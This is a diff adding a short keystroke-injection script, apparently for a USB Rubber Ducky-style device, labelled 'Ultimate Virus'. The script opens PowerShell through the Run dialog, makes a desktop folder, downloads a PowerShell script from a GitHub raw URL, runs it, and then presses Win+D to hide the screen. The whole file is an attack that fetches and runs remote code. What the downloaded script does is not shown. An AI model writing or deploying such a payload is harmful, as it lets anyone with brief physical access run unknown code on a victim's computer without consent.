@@ -1,0 +1,18 @@
+REM Ultimate Virus by SirStilton9627
+WIN R
+DELAY 500
+STRING Powershell
+DELAY 200
+ENTER
+DELAY 3000
+STRING New-Item -ItemType Directory -Path "$env:USERPROFILE\Desktop\Ultimate_Virus" -force
+ENTER
+DELAY 100
+STRING Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SirStilton/Dq-3068hackDq-3068/refs/heads/main/Commands.ps1' -OutFile "$env:USERPROFILE\Desktop\Ultimate_Virus\Commands.ps1"
+ENTER
+DELAY 500
+STRING & "$env:USERPROFILE\Desktop\Ultimate_Virus\Commands.ps1"
+ENTER
+DELAY 100
+WIN D
+REM End
